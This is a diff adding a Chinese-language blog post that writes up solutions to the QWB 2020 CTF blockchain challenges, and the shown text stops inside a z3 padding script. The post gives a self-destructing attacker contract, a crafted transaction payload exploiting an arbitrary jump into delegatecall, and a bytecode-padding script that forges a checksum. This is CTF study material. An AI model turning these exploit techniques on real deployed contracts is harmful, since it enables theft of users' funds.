@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="syang">
+  <meta name="description" content="Life Is Like A Boat">
+  
+  
+  <link rel="prev" href="https://syang-ng.github.io/2020/08/security-2015-uipicker/" />
+  
+  <link rel="canonical" href="https://syang-ng.github.io/2020/08/qwb-2020-blockchain/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           QWB 2020 Blockchain | syang&#39;s blog
+       
+  </title>
+  <meta name="title" content="QWB 2020 Blockchain | syang&#39;s blog">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/syang-ng.github.io"
+    },
+    "articleSection" : "posts",
+    "name" : "QWB 2020 Blockchain",
+    "headline" : "QWB 2020 Blockchain",
+    "description" : "QWB 2020 的区块链题目，最后一题没调出来，还是太菜了 EasyFake 测试地址 ropsten@0xa8978dc9669dd26f9342e8f47da39d5c6c866cdf 由于原合约已自毁，需要参考 bytecode 的可以参考 https:\/\/ropsten.etherscan.io\/address\/0x23362f22ceb0eaaec5f102ae74d6da09e15c96b2#code 上的 bytecode，利用 ethervm.io 反编译的结果在",
+    "inLanguage" : "zh-cn",
+    "author" : "syang",
+    "creator" : "syang",
+    "publisher": "syang",
+    "accountablePerson" : "syang",
+    "copyrightHolder" : "syang",
+    "copyrightYear" : "2020",
+    "datePublished": "2020-08-25 23:27:11 \x2b0800 CST",
+    "dateModified" : "2020-08-25 23:27:11 \x2b0800 CST",
+    "url" : "https:\/\/syang-ng.github.io\/2020\/08\/qwb-2020-blockchain\/",
+    "wordCount" : "1847",
+    "keywords" : [  "syang\x27s blog"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">QWB 2020 Blockchain</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://syang-ng.github.io" rel="author">syang</a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2020-08-25 itemprop="datePublished">August 25, 2020</time>
+                </span>
+                in
+                <i class="iconfont icon-folder"></i>
+                <span class="post-category">
+                        <a href="https://syang-ng.github.io/categories/ctf/"> CTF </a>
+                        <a href="https://syang-ng.github.io/categories/smartcontract/"> SmartContract </a>
+                        
+                </span>
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <p>QWB 2020 的区块链题目，最后一题没调出来，还是太菜了</p>
+<h2 id="easyfake">EasyFake</h2>
+<p>测试地址 <a href="https://ropsten.etherscan.io/address/0xa8978dc9669dd26f9342e8f47da39d5c6c866cdf">ropsten@0xa8978dc9669dd26f9342e8f47da39d5c6c866cdf</a></p>
+<p>由于原合约已自毁，需要参考 bytecode 的可以参考 <a href="https://ropsten.etherscan.io/address/0x23362f22ceb0eaaec5f102ae74d6da09e15c96b2#code">https://ropsten.etherscan.io/address/0x23362f22ceb0eaaec5f102ae74d6da09e15c96b2#code</a> 上的 bytecode，利用 ethervm.io 反编译的结果在 <a href="https://gist.github.com/syang-ng/eb0b1deb430a68733ec31de874b5c309">https://gist.github.com/syang-ng/eb0b1deb430a68733ec31de874b5c309</a> 上。</p>
+<p>可以发现 <code>2665F77D</code> 对应的函数存在着一个任意跳转，而 0x0740 处代码可以调用 delegatecall，且调用的地址是可控的，所以解题的思路非常清晰：</p>
+<ol>
+<li>构造攻击合约，获得合约地址</li>
+<li>根据合约地址构造 payload</li>
+</ol>
+<p>攻击合约：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">contract</span> Solve {
+    <span style="color:#66d9ef">event</span> SendFlag(<span style="color:#66d9ef">address</span> addr);
+       
+    <span style="color:#66d9ef">function</span>() <span style="color:#66d9ef">external</span> {
+        emit SendFlag(tx.origin);
+        selfdestruct(tx.origin);
+    }
+}
+</code></pre></div><p>发送交易，触发函数执行：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">eth</span>.<span style="color:#a6e22e">sendTransaction</span>({<span style="color:#a6e22e">to</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;0xA8978Dc9669dd26F9342e8F47da39d5c6C866Cdf&#34;</span>, <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;0x2665F77D00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007400000000000000000000000007470Ab1bDA1D5DdfB5c1bFc36AE87746a4C9eE84&#34;</span> }, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>,<span style="color:#a6e22e">res</span>){<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">res</span>)});
+</code></pre></div><p>攻击相关的交易：</p>
+<ul>
+<li><a href="https://ropsten.etherscan.io/tx/0x11ca40039244405339620d604f4704e709483a79216c8f4055dec74d60988b2d">tx@https://ropsten.etherscan.io/tx/0x11ca40039244405339620d604f4704e709483a79216c8f4055dec74d60988b2d</a></li>
+</ul>
+<h2 id="easyassembly">EasyAssembly</h2>
+<p>题目给了源代码，测试地址 <a href="https://ropsten.etherscan.io/address/0xd0283a6180eabf69005253073cd1954e33f2a8d2">ropsten@0xD0283a6180EABF69005253073CD1954E33F2a8d2</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">10</span>;
+
+<span style="color:#66d9ef">contract</span> EasyAssembly {
+    <span style="color:#66d9ef">event</span> SendFlag(<span style="color:#66d9ef">address</span> addr);
+
+    <span style="color:#66d9ef">uint</span> randomNumber <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">bytes32</span> <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">constant</span> ownerslot <span style="color:#f92672">=</span> <span style="color:#a6e22e">keccak256</span>(<span style="color:#e6db74">&#39;Welcome to qwb!!! You will find this so easy ~ Happy happy :D&#39;</span>);
+
+    <span style="color:#66d9ef">bytes32</span>[] <span style="color:#66d9ef">public</span> puzzle;
+    <span style="color:#66d9ef">uint</span> count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">mapping</span>(<span style="color:#66d9ef">address</span><span style="color:#f92672">=&gt;</span><span style="color:#66d9ef">bytes32</span>) WinChecksum;
+
+    constructor() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
+        setAddress(ownerslot, msg.sender);
+    }
+
+    <span style="color:#66d9ef">modifier</span> onlyWin(<span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">memory</span> code) {
+        require(WinChecksum[msg.sender] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>);
+        <span style="color:#66d9ef">bytes32</span> tmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">keccak256</span>(abi.encodePacked(code));
+        <span style="color:#66d9ef">address</span> target;
+        <span style="color:#66d9ef">assembly</span> {
+            <span style="color:#f92672">let</span> t1,t2,t3
+            t1 <span style="color:#f92672">:=</span> <span style="color:#a6e22e">and</span>(tmp, <span style="color:#ae81ff">0xffffffffffffffff</span>)
+            t2 <span style="color:#f92672">:=</span> <span style="color:#a6e22e">and</span>(shr(<span style="color:#ae81ff">0x40</span>,tmp), <span style="color:#ae81ff">0xffffffffffffffff</span>)
+            t3 <span style="color:#f92672">:=</span> <span style="color:#a6e22e">and</span>(shr(<span style="color:#ae81ff">0x80</span>,tmp), <span style="color:#ae81ff">0xffffffff</span>)
+            target <span style="color:#f92672">:=</span> <span style="color:#a6e22e">xor</span>(<span style="color:#a6e22e">mul</span>(<span style="color:#a6e22e">xor</span>(<span style="color:#a6e22e">mul</span>(t3, <span style="color:#ae81ff">0x10000000000000000</span>), t2), <span style="color:#ae81ff">0x10000000000000000</span>), t1)
+        }
+        require(<span style="color:#a6e22e">address</span>(target)<span style="color:#960050;background-color:#1e0010">==</span>msg<span style="color:#960050;background-color:#1e0010">.</span>sender)<span style="color:#960050;background-color:#1e0010">;</span>
+        _<span style="color:#960050;background-color:#1e0010">;</span>
+    }
+
+    <span style="color:#66d9ef">function</span> setAddress(<span style="color:#66d9ef">bytes32</span> _slot, <span style="color:#66d9ef">address</span> _address) <span style="color:#66d9ef">internal</span> {
+        <span style="color:#66d9ef">bytes32</span> s <span style="color:#f92672">=</span> _slot;
+        <span style="color:#66d9ef">assembly</span> { <span style="color:#a6e22e">sstore</span>(s, _address) }
+    }
+
+    <span style="color:#66d9ef">function</span> deploy(<span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">memory</span> code) <span style="color:#66d9ef">internal</span> <span style="color:#66d9ef">returns</span>(<span style="color:#66d9ef">address</span> addr) {
+        <span style="color:#66d9ef">assembly</span> {
+            addr <span style="color:#f92672">:=</span> create2(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">add</span>(code, <span style="color:#ae81ff">0x20</span>), <span style="color:#a6e22e">mload</span>(code), <span style="color:#ae81ff">0x1234</span>)
+            if <span style="color:#a6e22e">eq</span>(<span style="color:#a6e22e">extcodesize</span>(addr), <span style="color:#ae81ff">0</span>) { <span style="color:#a6e22e">revert</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>) }
+        }
+    }
+
+    <span style="color:#66d9ef">function</span> gift() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
+        require(count <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
+        count <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+        <span style="color:#66d9ef">if</span>(msg.value <span style="color:#f92672">&gt;=</span> <span style="color:#66d9ef">address</span>(this).balance){
+            emit SendFlag(msg.sender);
+        }<span style="color:#66d9ef">else</span>{
+            selfdestruct(msg.sender);
+        }
+    }
+
+    <span style="color:#66d9ef">function</span> pass(<span style="color:#66d9ef">uint</span> idx, <span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">memory</span> bytecode) <span style="color:#66d9ef">public</span> {
+        <span style="color:#66d9ef">address</span> addr <span style="color:#f92672">=</span> deploy(bytecode);
+        <span style="color:#66d9ef">bytes32</span> cs <span style="color:#f92672">=</span> tag(bytecode);
+        <span style="color:#66d9ef">bytes32</span> tmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">keccak256</span>(abi.encodePacked(<span style="color:#66d9ef">uint</span>(<span style="color:#ae81ff">1</span>)));
+        <span style="color:#66d9ef">uint32</span> v;
+        <span style="color:#66d9ef">bool</span> flag <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+
+        <span style="color:#66d9ef">assembly</span> {
+            <span style="color:#f92672">let</span> v1,v2
+            v <span style="color:#f92672">:=</span> <span style="color:#a6e22e">sload</span>(<span style="color:#a6e22e">add</span>(tmp, idx))
+            if <span style="color:#a6e22e">gt</span>(v, <span style="color:#a6e22e">sload</span>(<span style="color:#ae81ff">0</span>)){
+                v1 <span style="color:#f92672">:=</span> <span style="color:#a6e22e">and</span>(<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">and</span>(v,<span style="color:#ae81ff">0xffffffff</span>), <span style="color:#a6e22e">and</span>(shr(<span style="color:#ae81ff">0x20</span>,v), <span style="color:#ae81ff">0xffffffff</span>)), <span style="color:#ae81ff">0xffffffff</span>)
+                v2 <span style="color:#f92672">:=</span> <span style="color:#a6e22e">and</span>(<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">xor</span>(<span style="color:#a6e22e">and</span>(shr(<span style="color:#ae81ff">0x40</span>,v), <span style="color:#ae81ff">0xffffffff</span>), <span style="color:#a6e22e">and</span>(shr(<span style="color:#ae81ff">0x60</span>,v), <span style="color:#ae81ff">0xffffffff</span>)), <span style="color:#a6e22e">and</span>(shr(<span style="color:#ae81ff">0x80</span>,v),<span style="color:#ae81ff">0xffffffff</span>)), <span style="color:#ae81ff">0xffffffff</span>)
+                if <span style="color:#a6e22e">eq</span>(<span style="color:#a6e22e">xor</span>(<span style="color:#a6e22e">mul</span>(v2,<span style="color:#ae81ff">0x100000000</span>), v1), cs){
+                    flag <span style="color:#f92672">:=</span> <span style="color:#ae81ff">1</span>
+                }
+            }
+        }
+        if(flag){
+            WinChecksum<span style="color:#960050;background-color:#1e0010">[</span>addr<span style="color:#960050;background-color:#1e0010">]</span> <span style="color:#960050;background-color:#1e0010">=</span> cs<span style="color:#960050;background-color:#1e0010">;</span>
+        }else{
+            WinChecksum<span style="color:#960050;background-color:#1e0010">[</span>addr<span style="color:#960050;background-color:#1e0010">]</span> <span style="color:#960050;background-color:#1e0010">=</span> bytes32(<span style="color:#ae81ff">0</span>)<span style="color:#960050;background-color:#1e0010">;</span>
+        }
+    }
+
+    <span style="color:#66d9ef">function</span> tag(<span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">memory</span> a) <span style="color:#66d9ef">pure</span> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">returns</span>(<span style="color:#66d9ef">bytes32</span> cs) {
+        <span style="color:#66d9ef">assembly</span>{
+            <span style="color:#f92672">let</span> groupsize <span style="color:#f92672">:=</span> <span style="color:#ae81ff">16</span>
+            <span style="color:#f92672">let</span> head <span style="color:#f92672">:=</span> <span style="color:#a6e22e">add</span>(a,groupsize)
+            <span style="color:#f92672">let</span> tail <span style="color:#f92672">:=</span> <span style="color:#a6e22e">add</span>(head, <span style="color:#a6e22e">mload</span>(a))
+            <span style="color:#f92672">let</span> t1 <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0x13145210</span>
+            <span style="color:#f92672">let</span> t2 <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0x80238023</span>
+            <span style="color:#f92672">let</span> m1,m2,m3,m4,s,tmp
+            <span style="color:#a6e22e">for</span> { <span style="color:#f92672">let</span> i <span style="color:#f92672">:=</span> head } <span style="color:#a6e22e">lt</span>(i, tail) { i <span style="color:#f92672">:=</span> <span style="color:#a6e22e">add</span>(i, groupsize) } {
+                s <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0x59129121</span>
+                tmp <span style="color:#f92672">:=</span> <span style="color:#a6e22e">mload</span>(i)
+                m1 <span style="color:#f92672">:=</span> <span style="color:#a6e22e">and</span>(tmp,<span style="color:#ae81ff">0xffffffff</span>)
+                m2 <span style="color:#f92672">:=</span> <span style="color:#a6e22e">and</span>(shr(<span style="color:#ae81ff">0x20</span>,tmp),<span style="color:#ae81ff">0xffffffff</span>)
+                m3 <span style="color:#f92672">:=</span> <span style="color:#a6e22e">and</span>(shr(<span style="color:#ae81ff">0x40</span>,tmp),<span style="color:#ae81ff">0xffffffff</span>)
+                m4 <span style="color:#f92672">:=</span> <span style="color:#a6e22e">and</span>(shr(<span style="color:#ae81ff">0x60</span>,tmp),<span style="color:#ae81ff">0xffffffff</span>)
+                <span style="color:#a6e22e">for</span> { <span style="color:#f92672">let</span> j <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span> } <span style="color:#a6e22e">lt</span>(j, <span style="color:#ae81ff">0x4</span>) { j <span style="color:#f92672">:=</span> <span style="color:#a6e22e">add</span>(j, <span style="color:#ae81ff">1</span>) } {
+                    s <span style="color:#f92672">:=</span> <span style="color:#a6e22e">and</span>(<span style="color:#a6e22e">mul</span>(s, <span style="color:#ae81ff">2</span>),<span style="color:#ae81ff">0xffffffff</span>)
+                    t2 <span style="color:#f92672">:=</span> <span style="color:#a6e22e">and</span>(<span style="color:#a6e22e">add</span>(t1, <span style="color:#a6e22e">xor</span>(<span style="color:#a6e22e">sub</span>(<span style="color:#a6e22e">mul</span>(t1, <span style="color:#ae81ff">0x10</span>), m1),<span style="color:#a6e22e">xor</span>(<span style="color:#a6e22e">add</span>(t1, s),<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">div</span>(t1,<span style="color:#ae81ff">0x20</span>), m2)))), <span style="color:#ae81ff">0xffffffff</span>)
+                    t1 <span style="color:#f92672">:=</span> <span style="color:#a6e22e">and</span>(<span style="color:#a6e22e">add</span>(t2, <span style="color:#a6e22e">xor</span>(<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">mul</span>(t2, <span style="color:#ae81ff">0x10</span>), m3),<span style="color:#a6e22e">xor</span>(<span style="color:#a6e22e">add</span>(t2, s),<span style="color:#a6e22e">sub</span>(<span style="color:#a6e22e">div</span>(t2,<span style="color:#ae81ff">0x20</span>), m4)))), <span style="color:#ae81ff">0xffffffff</span>)
+                }
+            }
+            cs <span style="color:#f92672">:=</span> <span style="color:#a6e22e">xor</span>(<span style="color:#a6e22e">mul</span>(t1,<span style="color:#ae81ff">0x100000000</span>),t2)
+        }
+    }
+
+    <span style="color:#66d9ef">function</span> payforflag(<span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">memory</span> code) <span style="color:#66d9ef">public</span> onlyWin(code) {
+        emit SendFlag(msg.sender);
+        selfdestruct(msg.sender);
+    }
+}
+</code></pre></div><p>题目的要求是触发 <code>SendFlag</code>，有两个思路，一是触发 <code>gift()</code> 但 <code>msg.value &gt;= address(this).balance</code> 其实是无法满足的，因此只能考虑触发 <code>payforflag()</code>。</p>
+<p>解题思路：</p>
+<ol>
+<li>利用 <code>setAddress(ownerslot, msg.sender);</code> 保存的 msg.sender 满足 <code>v, sload(0)</code></li>
+<li>padding 攻击合约的 bytecode，使其最后的计算结果满足等式 <code> eq(xor(mul(v2,0x100000000), v1), cs)</code></li>
+<li>利用 <code>create2</code> 计算地址的原理，还原 code，满足 <code>require(address(target)==msg.sender);</code></li>
+</ol>
+<p>合约代码：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">contract</span> Solve {
+    <span style="color:#66d9ef">function</span> payforflag(<span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">memory</span> code) <span style="color:#66d9ef">public</span> {
+        EasyAssembly instance <span style="color:#f92672">=</span> EasyAssembly(<span style="color:#ae81ff">0xD0283a6180EABF69005253073CD1954E33F2a8d2</span>);
+        instance.payforflag(code);
+    }
+
+    <span style="color:#66d9ef">function</span> kill() <span style="color:#66d9ef">public</span> {
+        selfdestruct(msg.sender);
+    }
+}
+</code></pre></div><p>padding 脚本：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> z3 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calc</span>(v):
+    v1 <span style="color:#f92672">=</span> ((v <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>) <span style="color:#f92672">+</span> ((v <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+    v2 <span style="color:#f92672">=</span> ((((v <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x40</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>) <span style="color:#f92672">^</span> ((v <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x60</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>)) <span style="color:#f92672">+</span> ((v <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x80</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+    value <span style="color:#f92672">=</span> (v2 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">^</span> v1
+    
+    <span style="color:#66d9ef">return</span> hex(value)[<span style="color:#ae81ff">2</span>::]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">16</span>)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tag</span>(a):
+    <span style="color:#66d9ef">if</span> len(a) <span style="color:#f92672">%</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+        a <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;0&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">32</span> <span style="color:#f92672">-</span> len(a) <span style="color:#f92672">%</span> <span style="color:#ae81ff">32</span>)
+
+    t1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x13145210</span>
+    t2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80238023</span>
+
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(a), <span style="color:#ae81ff">32</span>):
+        s <span style="color:#f92672">=</span>  <span style="color:#ae81ff">0x59129121</span>
+        tmp <span style="color:#f92672">=</span> int(a[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">32</span>], <span style="color:#ae81ff">16</span>)
+        m1 <span style="color:#f92672">=</span> tmp <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+        m2 <span style="color:#f92672">=</span> (tmp <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+        m3 <span style="color:#f92672">=</span> (tmp <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x40</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+        m4 <span style="color:#f92672">=</span> (tmp <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x60</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+        
+        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
+            s <span style="color:#f92672">=</span> (s<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+
+            t2 <span style="color:#f92672">=</span> (t1 <span style="color:#f92672">+</span> (((t1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">-</span> m1) <span style="color:#f92672">^</span> ((t1 <span style="color:#f92672">+</span> s) <span style="color:#f92672">^</span> ((t1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> m2)))) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+            t1 <span style="color:#f92672">=</span> (t2 <span style="color:#f92672">+</span> (((t2 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> m3) <span style="color:#f92672">^</span> ((t2 <span style="color:#f92672">+</span> s) <span style="color:#f92672">^</span> ((t2 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">-</span> m4)))) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+
+    <span style="color:#66d9ef">return</span> hex((t1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">^</span> t2)[<span style="color:#ae81ff">2</span>::]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">16</span>)
+
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solve_pad</span>(current, target):
+    t1, t2 <span style="color:#f92672">=</span> int(current[:<span style="color:#ae81ff">8</span>:], <span style="color:#ae81ff">16</span>), int(current[<span style="color:#ae81ff">8</span>::], <span style="color:#ae81ff">16</span>)
+
+    target_t1, target_t2 <span style="color:#f92672">=</span> int(target[:<span style="color:#ae81ff">8</span>:], <span style="color:#ae81ff">16</span>), int(target[<span style="color:#ae81ff">8</span>::], <span style="color:#ae81ff">16</span>)
+
+    s <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x59129121</span>
+    m1 <span style="color:#f92672">=</span> BitVec(<span style="color:#e6db74">&#39;m1&#39;</span>, <span style="color:#ae81ff">256</span>)
+    m2 <span style="color:#f92672">=</span> BitVec(<span style="color:#e6db74">&#39;m2&#39;</span>, <span style="color:#ae81ff">256</span>)
+    m3 <span style="color:#f92672">=</span> BitVec(<span style="color:#e6db74">&#39;m3&#39;</span>, <span style="color:#ae81ff">256</span>)
+    m4 <span style="color:#f92672">=</span> BitVec(<span style="color:#e6db74">&#39;m4&#39;</span>, <span style="color:#ae81ff">256</span>)
+    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
+        s <span style="color:#f92672">=</span> (s<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+
+        t2 <span style="color:#f92672">=</span> (t1 <span style="color:#f92672">+</span> (((t1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">-</span> m1) <span style="color:#f92672">^</span> ((t1 <span style="color:#f92672">+</span> s) <span style="color:#f92672">^</span> ((t1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> m2)))) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+        t1 <span style="color:#f92672">=</span> (t2 <span style="color:#f92672">+</span> (((t2 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> m3) <span style="color:#f92672">^</span> ((t2 <span style="color:#f92672">+</span> s) <span style="color:#f92672">^</span> ((t2 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">-</span> m4)))) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+
+    solver <span style="color:#f92672">=</span> Solver()
+    solver<span style="color:#f92672">.</span>add(And(t1 <span style="color:#f92672">==</span> target_t1, t2 <span style="color:#f92672">==</span> target_t2))
+    <span style="color:#66d9ef">if</span> solver<span style="color:#f92672">.</span>check():
+        m <span style="color:#f92672">=</span> solver<span style="color:#f92672">.</span>model()
+        m_values <span style="color:#f92672">=</span> list(map(<span style="color:#66d9ef">lambda</span> x: m[x]<span style="color:#f92672">.</span>as_long(), [m1, m2, m3, m4]))
+        pad <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
+            pad <span style="color:#f92672">|=</span> m_values[i] <span style="color:#f92672">&lt;&lt;</span> (<span style="color:#ae81ff">0x20</span> <span style="color:#f92672">*</span> i)
+        <span style="color:#66d9ef">return</span> hex(pad)[<span style="color:#ae81ff">2</span>::]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">32</span>)
